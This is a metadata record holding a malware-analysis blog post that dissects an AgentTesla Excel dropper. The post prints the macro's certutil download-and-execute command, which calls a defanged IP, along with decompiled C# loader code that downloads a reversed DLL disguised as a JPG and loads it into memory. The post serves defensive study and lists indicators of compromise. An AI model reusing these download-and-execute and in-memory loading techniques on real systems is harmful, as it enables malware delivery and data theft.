{
    "id": "2159455c-c901-4afc-8bc7-16c6696a1262",
    "created_at": "2023-01-12T15:08:00.689988Z",
    "updated_at": "2025-03-27T02:08:40.460255Z",
    "deleted_at": null,
    "sha1_hash": "997b68261d31081923abd357e48c1a6ac697a4b2",
    "title": "2022-03-26 - An AgentTesla Sample Using VBA Macros and Certutil",
    "authors": "",
    "file_creation_date": "2022-05-28T05:07:15Z",
    "file_modification_date": "2022-05-28T05:07:15Z",
    "file_size": 140649,
    "plain_text": "# An AgentTesla Sample Using VBA Macros and Certutil\n\n**forensicitguy.github.io/agenttesla-vba-certutil-download/**\n\nMarch 26, 2022\n\n### By Tony Lambert Posted 2022-03-26 Updated 2022-03-28 11 min read\n\n AgentTesla is a .NET stealer that adversaries commonly buy and combine with other malicious products for deployment. In this post I’m tearing into a XLSM document that downloads and executes further AgentTesla malware. If you want to follow along at home, the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/d1c616976e917d54778f587a2550ee5568a72b661d5f04e68d19 4ce998864d84/.\n\n## Triaging the first stage\n\n### First stop, triage! MalwareBazaar claims the file is a XLSM Excel document but we should still verify just in case.\n\n\n-----\n\n```\n  remnux@remnux:~/cases/tesla-xlsm$ diec mv_tvm.xlsm \n  Binary\n    Archive: Zip(2.0)[25.6%,1 file]\n    Data: ZIP archive\n  remnux@remnux:~/cases/tesla-xlsm$ file mv_tvm.xlsm \n  mv_tvm.xlsm: Microsoft Excel 2007+\n  remnux@remnux:~/cases/tesla-xlsm$ xxd mv_tvm.xlsm | head\n  00000000: 504b 0304 1400 0800 0800 780d 7954 7c5e \n  PK........x.yT|^\n  00000010: 7c2f 8e01 0000 1006 0000 1300 0000 5b43 \n  |/............[C\n  00000020: 6f6e 7465 6e74 5f54 7970 6573 5d2e 786d \n  ontent_Types].xm\n  00000030: 6ccd 544d 6fdb 300c fd2b 86ae 85a5 b487 \n  l.TMo.0..+......\n  00000040: 6218 e2f4 b076 c7b5 c0ba 1fc0 484c ac46 \n  b....v......HL.F\n  00000050: 5f10 d534 f9f7 a3ec 066b 0377 c8b0 0cd8 \n  _..4.....k.w....\n  00000060: c516 f5f8 f81e 65ca f39b 9d77 cd16 33d9 \n  ......e....w..3.\n  00000070: 183a 7129 67a2 c1a0 a3b1 61dd 891f 8f5f \n  .:q)g.....a...._\n  00000080: db4f a2a1 02c1 808b 013b b147 1237 8bf9 \n  .O.......;.G.7..\n  00000090: e33e 2135 cc0d d489 be94 f459 29d2 3d7a \n  .>!5.......Y).=z\n\n### Detect-It-Easy thinks we have a ZIP archive and file thinks we have a Microsoft Excel 2007+ document. Both are correct as MS Excel 2007+ documents are essentially ZIP archives containing XML files. We can verify that assumption using xxd and seeing the file names of XML files within the XLSM document. Now we definitely know, this document is for MS Excel.\n\n## Analyzing the document macro\n\n```\n\n-----\n\n### The easiest way to grab low-hanging macro functionality for me is through olevba . In this case, the macro functionality is straightforward:\n```\n  remnux@remnux:~/cases/tesla-xlsm$ olevba mv_tvm.xlsm \n  olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools\n  ===============================================================================\n  FILE: mv_tvm.xlsm\n  Type: OpenXML\n  ------------------------------------------------------------------------------  VBA MACRO ThisWorkbook.cls \n  in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'\n  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n  Private Sub Workbook_Open()\n  PID = Shell(\"cmd /c certutil.exe -urlcache -split -f\n  \"\"hxxp://18.179.111[.]240/xr0/loader/uploads/scan08710203065.exe\"\" Lqdzvm.exe.exe &&\n  Lqdzvm.exe.exe\", vbHide)\n  End Sub\n  +----------+--------------------+---------------------------------------------+\n  |Type   |Keyword       |Description                 |\n  +----------+--------------------+---------------------------------------------+\n  |AutoExec |Workbook_Open    |Runs when the Excel Workbook is opened    |\n  |Suspicious|Shell        |May run an executable file or a system    |\n  |     |          |command                   |\n  |Suspicious|vbHide       |May run an executable file or a system    |\n  |     |          |command                   |\n  |Suspicious|Hex Strings     |Hex-encoded strings were detected, may be  |\n  |     |          |used to obfuscate strings (option --decode to|\n  |     |          |see all)                   |\n  |Suspicious|Base64 Strings   |Base64-encoded strings were detected, may be |\n  |     |          |used to obfuscate strings (option --decode to|\n  |     |          |see all)                   |\n  |IOC    |hxxp://18.179.111[.]24|URL                     |\n  |     |0/xr0/loader/uploads|                       |\n  |     |/scan08710203065.exe|                       |\n  |IOC    |18.179.111[.]240   |IPv4 address                 |\n  |IOC    |certutil.exe    |Executable file name             |\n  |IOC    |scan08710203065.exe |Executable file name             |\n  |IOC    |Lqdzvm.exe     |Executable file name             |\n  +----------+--------------------+---------------------------------------------+\n\n```\n\n-----\n\n### The macro contains a subroutine named Workbook_Open, which launches when Excel opens this document. The subroutine executes a Shell command, which spawns cmd.exe and a\n\n#### certutil.exe process. The certutil process uses a -urlcache and -split command line\n### option, downloads from the specified URL, and stores the contents within Lqdzvm.exe.exe Afterward, cmd.exe executes the downloaded EXE.\n\n Since the VBA macro here is pretty brief, there’s not much else to investigate in the document. Let’s move on to the second stage, the downloaded EXE.\n\n## Analyzing Lqdzvm.exe.exe\n\n### We can get a lead on this EXE using diec and file .\n\n\n-----\n\n```\n  remnux@remnux:~/cases/tesla-xlsm$ file Lqdzvm.exe.exe \n  Lqdzvm.exe.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS\n  Windows\n  remnux@remnux:~/cases/tesla-xlsm$ diec Lqdzvm.exe.exe \n  PE32\n    Protector: Smart Assembly(-)[-]\n    Library: .NET(v4.0.30319)[-]\n    Linker: Microsoft Linker(8.0)[GUI32]\n\n### The file output for the EXE indicates it is a Mono/.NET assembly for Windows. The diec command gets more specific, showing the EXE is also protected using Smart Assembly, a commercial obfuscator for .NET technologies. Using that knowledge we can attempt some deobfuscation and decompilation using ilspycmd .\n  remnux@remnux:~/cases/tesla-xlsm$ de4dot Lqdzvm.exe.exe -p sa\n  de4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com\n  Latest version and source code: https://github.com/0xd4d/de4dot\n  Detected SmartAssembly 8.1.0.4892 (/home/remnux/cases/tesla-xlsm/Lqdzvm.exe.exe)\n  Cleaning /home/remnux/cases/tesla-xlsm/Lqdzvm.exe.exe\n  Renaming all obfuscated symbols\n  Saving /home/remnux/cases/tesla-xlsm/Lqdzvm.exe-cleaned.exe\n  remnux@remnux:~/cases/tesla-xlsm$ ilspycmd Lqdzvm.exe-cleaned.exe > Lqdzvm.exe  cleaned.decompiled.cs\n\n From here we can examine the decompiled C# code, starting with the assembly properties.\n\n```\n\n-----\n\n```\n  [assembly: CompilationRelaxations(8)]\n  [assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]\n  [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default |\n  DebuggableAttribute.DebuggingModes.DisableOptimizations |\n  DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints |\n  DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]\n  [assembly: AssemblyTitle(\"BandiFix\")]\n  [assembly: AssemblyDescription(\"BandiFix\")]\n  [assembly: AssemblyConfiguration(\"\")]\n  [assembly: AssemblyCompany(\"Bandicam.com\")]\n  [assembly: AssemblyProduct(\"BandiFix\")]\n  [assembly: AssemblyCopyright(\"Copyright(c) 2010-2020 Bandicam.com. All rights\n  reserved.\")]\n  [assembly: AssemblyTrademark(\"\")]\n  [assembly: ComVisible(false)]\n  [assembly: Guid(\"3659e84e-1949-4909-85ac-f5710802a51c\")]\n  [assembly: AssemblyFileVersion(\"2.0.0.111\")]\n  [assembly: TargetFramework(\".NETFramework,Version=v4.0\", FrameworkDisplayName =\n  \".NET Framework 4\")]\n  [assembly: AssemblyVersion(\"2.0.0.111\")]\n\n### The assembly properties/attributes here resemble those for the Bandicam BandiFix application. The adversary is likely trying to masquerade as the application to avoid attention. The GUID\n\n#### 3659e84e-1949-4909-85ac-f5710802a51c in this EXE is a TypeLib ID GUID. You can\n### potentially use the property in VT or other tools to pivot and find similar EXEs.\n\n Next, we can dive into the entry point, Main() .\n\n```\n\n-----\n\n```\n  namespace ns0\n  {\n       internal class Class0\n       {\n           [STAThread]\n           private static void\n  Main()\n           {\n  Class1.smethod_0();\n  Class1.smethod_1();\n  Class2.smethod_1();\n           }\n       }\n\n### The Main() function is pretty simple, branching off to three other methods defined in two classes. Let’s jump into the code at Class1.smethod_0() to see it.\n\n```\n\n-----\n\n```\n  internal class Class1\n  {\n    static void smethod_0()\n    {\n      ProcessStartInfo val = new ProcessStartInfo();\n      val.set_FileName(\"powershell\");\n      val.set_Arguments(\"-enc\n  UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMgAwAA==\");\n      val.set_WindowStyle((ProcessWindowStyle)1);\n      Process.Start(val).WaitForExit();\n      try\n      {\n        ServicePointManager.set_SecurityProtocol((SecurityProtocolType)3072);\n      }\n      catch\n      {\n      }\n    }\n\n### This method creates a ProcessStartInfo object, fills its properties with values to launch PowerShell with a base64-encoded command line, sets the window style to hidden, and starts the PowerShell process. The encoded PowerShell command decodes to Start-Sleep Seconds 20 . Combined with the WaitForExit() function when started, this shows the code\n\n waits/sleeps for 20 seconds before moving to the next step. In the next step, the code sets the .NET ServicePointManager’s SecurityProtocol property to TLS1.2.\n\n Now we can move into the next function, Class1.smethod_1() .\n\n```\n\n-----\n\n```\nstatic void smethod_1()\n{\n  List<byte> list = new List<byte>();\n  byte[] array = Class2.smethod_0();\n  Stack val = new Stack();\n  val.Push((object)\"Welcome\");\n  val.Push((object)\"Tutlane\");\n  val.Push((object)20.5f);\n  val.Push((object)10);\n  val.Push((object)null);\n  int num = array.Length;\n  while (num-- > 0)\n  {\n    list.Add(array[num]);\n  }\n  val.Push((object)100);\n  foreach (object? item in val)\n  {\n    Console.WriteLine(item);\n  }\nAppDomain.CurrentDomain.Load(list.ToArray())\n;\n}\n\n```\n\n-----\n\n### Within the function there is immediately some interesting code. First, there is a byte[] array that holds content from Class2.smethod_0() byte arrays in malware tend to include string or binary content, so my hypothesis for the array is that is designed to hold one of those. The code then manipulates a Stack object, pushing objects onto it. It doesn’t seem to use them in a productive way outside a subsequent Console.WriteLine call. The byte array does get used, in a reversal algorithm. The num variable and following while loop starts with the ending element of the byte array and moves backward to the first, adding each element to a list. After the reversal, the list gets converted back to an array and used as a parameter for\n```\nAppDomain.CurrentDomain.Load(). This call is designed to load an arbitrary .NET assembly\n\n into the current application domain. This is roughly similar to\nSystem.Reflection.Assembly.Load() . This adds some credence to our hypothesis from\n\n earlier, that the byte array will likely hold binary content that translates into an assembly. So let’s pivot over to that function to see what it does.\n  internal class Class2 : Process\n  {\n  internal static byte[] smethod_0()\n  {\n    string[] array = new string[3]\n    {\n      \"Dot\",\n      \"Net\",\n      \"Perls\"\n    };\n    Stack<string> val = new Stack<string>((IEnumerable<string>)array);\n    Enumerator<string> enumerator = val.GetEnumerator();\n    try\n    {\n      while (enumerator.MoveNext())\n      {\n        string current = enumerator.get_Current();\n        Console.WriteLine(current);\n      }\n    }\n    finally\n    {\n      ((IDisposable)enumerator).Dispose();\n    }\n    return\n  Class1.smethod_2(\"hxxp://18.179.111[.]240/xr0/loader/uploads/scan08710203065_Kvnllpaf.j\n  pg\");\n  }\n\n```\n\n-----\n\n### Most of the code in this function is either junk or imposes a slight delay before further execution. The only real important code in the function is the last line that calls Class1.smethod_2(), passing in a URL to an alleged JPG file. We know this function is supposed to return a byte array to get reversed and loaded into memory, so there’s a decent chance this upcoming code performs a download of a reversed Windows EXE or DLL. Let’s jump to that code:\n```\n  static byte[] smethod_2(string string_0)\n  {\n    using MemoryStream memoryStream = new MemoryStream();\n    WebRequest val = WebRequest.Create(string_0);\n    Stream responseStream =\n  val.GetResponse().GetResponseStream();\n    responseStream.CopyTo(memoryStream);\n    return memoryStream.ToArray();\n  }\n\n```\n\n-----\n\n### Sure enough, the method creates a WebRequest object for the URL, passes its response into a MemoryStream, and returns the content as a byte array. This function ends the second branch of code from Main(), and we can dive into the final function from Main() here:\n```\n  internal static void smethod_1()\n  {\n    Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();\n    foreach (Assembly assembly in assemblies)\n    {\n      Type[] types = assembly.GetTypes();\n      foreach (Type type in types)\n      {\n        try\n        {\n          Queue<int> val = new Queue<int>();\n          val.Enqueue(10);\n          val.Enqueue(23);\n          val.Enqueue((int)type.InvokeMember(\"Zsjeajjr\",\n  BindingFlags.InvokeMethod, null, null, null));\n          val.Enqueue(5);\n          val.Enqueue(29);\n          Enumerator<int> enumerator = val.GetEnumerator();\n          try\n          {\n            while (enumerator.MoveNext())\n            {\n              int current = enumerator.get_Current();\n              Console.WriteLine(current);\n            }\n          }\n          ...\n\n```\n\n-----\n\n### I’ve gone ahead and left out some of the function code for brevity, the important bits are shown above. For each class/type in each assembly namespace in this application domain, the code searches for a method named Zsjeajjr() . Once found, the method gets invoked and control is passed to that method.\n\n Now we can explore that scan08710203065_Kvnllpaf.jpg file downloaded and loaded!\n\n## Analyzing scan08710203065_Kvnllpaf.jpg\n\n### From the previous stage we know this file should contain the bytes of a Windows EXE or DLL that are reversed. Our typical file and diec commands won’t work because the first bytes of the file will presumably be zeroes. We can use xxd and tail to see the file contents.\n```\n  remnux@remnux:~/cases/tesla-xlsm$ xxd scan08710203065_Kvnllpaf.jpg |\n  tail\n  00095760: 0009 5000 0006 010b 210e 00e0 0000 0000 ..P.....!.......\n  00095770: 0000 0000 623c f3a6 0003 014c 0000 4550 ....b<.....L..EP\n  00095780: 0000 0000 0000 0024 0a0d 0d2e 6564 6f6d .......$....edom\n  00095790: 2053 4f44 206e 6920 6e75 7220 6562 2074  SOD ni nur eb t\n  000957a0: 6f6e 6e61 6320 6d61 7267 6f72 7020 7369 onnac margorp si\n  000957b0: 6854 21cd 4c01 b821 cd09 b400 0eba 1f0e hT!.L..!........\n  000957c0: 0000 0080 0000 0000 0000 0000 0000 0000 ................\n  000957d0: 0000 0000 0000 0000 0000 0000 0000 0000 ................\n  000957e0: 0000 0000 0000 0040 0000 0000 0000 00b8 .......@........\n  000957f0: 0000 ffff 0000 0004 0000 0003 0090 5a4d ..............ZM\n\n```\n\n-----\n\n### Excellent, we have a MZ header and DOS stub reversed in the file bytes. We can easily get the original order using PowerShell code:\n```\n  [Byte[]] $code = Get-Content -AsByteStream\n  ./scan08710203065_Kvnllpaf.jpg\n  [Array]::Reverse($code)\n  Set-Content -Path ./original.bin -Value $code -AsByteStream\n\n Now we can examine the original binary file to see the next steps.\n  remnux@remnux:~/cases/tesla-xlsm$ diec original.bin \n  PE32\n    Protector: Eziriz .NET Reactor(6.x.x.x)[By Dr.FarFar]\n    Library: .NET(v4.0.30319)[-]\n    Linker: Microsoft Linker(6.0)[DLL32]\n  remnux@remnux:~/cases/tesla-xlsm$ file original.bin \n  original.bin: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS\n  Windows\n\n Once again, this stage looks to be a .NET DLL packed using .NET Reactor, another commercial obfuscator. This is where I want to stop for the evening because when I tried to move into subsequent stages I was stumped by some of the obfuscation and the amount of code in this original DLL. I leave its deobfuscation and decompilation up to the reader as further work if desired, and the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/5250352cea9441dd051802bd58ccc6b2faf05007ee599e6876b9 cce3fdc5aa26/.\n\n Thanks for reading!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-26 - An AgentTesla Sample Using VBA Macros and Certutil.pdf"
    ],
    "report_names": [
        "2022-03-26 - An AgentTesla Sample Using VBA Macros and Certutil.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536080,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653714435,
    "ts_modification_date": 1653714435,
    "files": {
        "pdf": "https://archive.orkl.eu/997b68261d31081923abd357e48c1a6ac697a4b2.pdf",
        "text": "https://archive.orkl.eu/997b68261d31081923abd357e48c1a6ac697a4b2.txt",
        "img": "https://archive.orkl.eu/997b68261d31081923abd357e48c1a6ac697a4b2.jpg"
    }
}